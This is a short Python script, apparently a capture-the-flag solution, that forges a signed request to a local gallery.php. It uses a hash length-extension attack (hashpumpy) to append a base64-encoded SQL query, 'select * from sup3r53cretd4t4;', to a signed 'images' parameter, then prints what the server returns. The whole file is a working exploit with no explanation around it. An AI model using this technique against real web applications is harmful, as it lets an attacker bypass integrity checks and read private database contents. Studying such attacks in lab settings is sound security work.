import requests
import hashpumpy
import warnings
import base64

warnings.filterwarnings("ignore", category=DeprecationWarning)
url = "http://localhost:11337/gallery.php"
b64_req = base64.b64encode(b"select * from sup3r53cretd4t4;")

hash,payload = hashpumpy.hashpump("8fc8cee62b7d63c442c0d331346c3ec9",'',b64_req,26)
r = requests.post(url,data={"images":payload+b"|"+hash.encode()})
print(r.text)